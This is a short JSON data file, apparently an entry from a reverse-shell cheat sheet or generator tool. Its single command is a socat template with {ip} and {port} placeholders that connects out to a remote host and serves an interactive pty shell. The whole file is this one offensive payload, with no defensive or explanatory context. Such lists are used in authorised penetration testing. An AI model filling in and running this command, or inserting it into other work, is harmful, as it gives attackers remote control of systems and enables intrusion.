{
  "commands": [
    {
      "title": "Socat reverse shell #2 with pty",
      "template": "socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane",
      "description": "Socat reverse shell with pseudo terminal and signal handling."
    }
  ]
}
